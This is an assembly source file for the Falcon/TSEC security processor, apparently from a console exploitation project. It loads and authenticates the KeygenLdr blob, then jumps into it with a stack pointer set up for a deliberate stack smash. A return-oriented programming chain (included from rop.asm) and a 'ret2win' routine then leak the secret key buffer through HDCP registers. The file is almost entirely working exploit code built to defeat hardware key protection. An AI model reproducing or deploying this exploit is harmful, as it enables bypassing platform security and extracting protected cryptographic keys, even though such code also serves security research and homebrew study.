include(`base_define.asm')
include(`forloop.m4')

.equ #KEY_DATA_SIZE 0x7C
.equ #BLOB1_PHYS_ADDR 0x400
.equ #BLOB1_VIRT_ADDR 0x300

_start:
    mov $r13 0x4200
    iord $r13 I[$r13]
    shr b32 $r13 0x9
    and $r13 0x1ff
    shl b32 $r13 0x8
    mov $sp $r13
    lcall #main
    exit

// The physical address of the key data blob, overridden by the repacker.
.b8 0
.b8 0
.b8 0
KEY_DATA_PHYS_ADDR: .b32 0x300

main:
    // Setup the stack.
    mov $r15 -0x10
    add $sp -0x11c

    mpush $r8

    mov $r9 $sp
    add b32 $r9 $r9 0xc4
    and $r3 $r9 $r15
    and $r4 $r9 $r15
    sub b32 $r9 $r9 0x8B

    // get the actual key data address. We need to copy 4 bytes to the DRAM from IRAM to see it..
    mov b32 $r10 $r3
    mov $r11 #KEY_DATA_PHYS_ADDR
    mov $r12 0x4
    lcall #memcpy_i2d

    // load key data into
    mov b32 $r10 $r3
    ld b32 $r11 D[$r3]
    // save key data physical address
    mov b32 $r5 $r11
    mov $r12 #KEY_DATA_SIZE
    lcall #memcpy_i2d

    // load blob1 size
    ld b32 $r12 D[$r3 + 0x74]

    mov b32 $r11 $r5
    add b32 $r11 0x100

    // Set r5 to the virtual address of blob1 (can be different from key data address)
    mov $r5 #BLOB1_VIRT_ADDR

    // shift value for cauth later and store it later
    shr b32 $r9 $r5 0x8

    st b32 D[$sp + 0x24] $r9

    clear b32 $r10
    lcall #memcpy_i2d


    // load blob1 size again???
    ld b32 $r12 D[$r3 + 0x74]

    mov b32 $r10 $r5
    clear b32 $r11
    mov b32 $r13 $r5
    mov $r14 0x1
    lcall #memcpy_d2i

    mov $r9 0x60000
    add b32 $r15 $r4 0x20
    clear b32 $r6
    or $r7 $r15 $r9
    clear b32 $r2
    clear b32 $r9
    clear b32 $r8

    // Copy key data for no reasons????
    mov b32 $r10 $r4
    mov b32 $r11 $r3
    mov $r12 #KEY_DATA_SIZE
    lcall #memcpy

    // Now authenticate and jump!

    // load blob1 size and set $cauth
    ld b32 $r9 D[$r4 + 0x74]
    ld b32 $r15 D[$sp + 0x24]
    shl b32 $r9 0x10
    or $r9 $r15
    mov $cauth $r9

    // get ready for the jump to HSEC
    cxset 0x2
    xdst $r8 $r7
    xdwait

    // Let it begin...
    lcall #start_exploit

    // Store an according result value in Falcon scratch 1.
    mov $r10 0xB0B0B0B0
    mov b32 $r15 $r10
    mov $r9 0x1100
    iowr I[$r9] $r15

    mpopaddret $r8 0x11c

include(`memcpy.asm')
include(`memcpy_d2i.asm')
include(`memcpy_i2d.asm')
include(`tsec_wait_dma.asm')
include(`tsec_dma_write.asm')
include(`tsec_set_key.asm')

start_exploit:
    // Use Falcon scratch 0 to backup the $sp value.
    mov $r15 $sp
    mov $r9 0x1000
    iowr I[$r9] $r15

    // Set some variables that KeygenLdr depends on.
    // key_buf
    mov b32 $r10 $r4
    // key_version
    mov $r11 0x1
    // is_stage2_decrypted
    mov $r12 0x0

    // Prepare $sp for the stack smash yet to happen.
    mov $r0 0xA00
    mov $sp $r0

    // Jump into KeygenLdr.
    call $r5

ret2win:
    // Restore the original $sp value to return to main.
    mov $r9 0x1000
    iord $r15 I[$r9]
    mov $sp $r15

    // The ROP chain stores the address of the key buffer in Falcon
    // DMem. From there, we can output the key through the HDCP MMIOs.
    clear b32 $r10
    mov $r10 #ROP_KEY_BUFFER
    lcall #tsec_set_key

    // We're done here, return back to main.
    ret

// Start of the ROP chain.
include(`rop.asm')
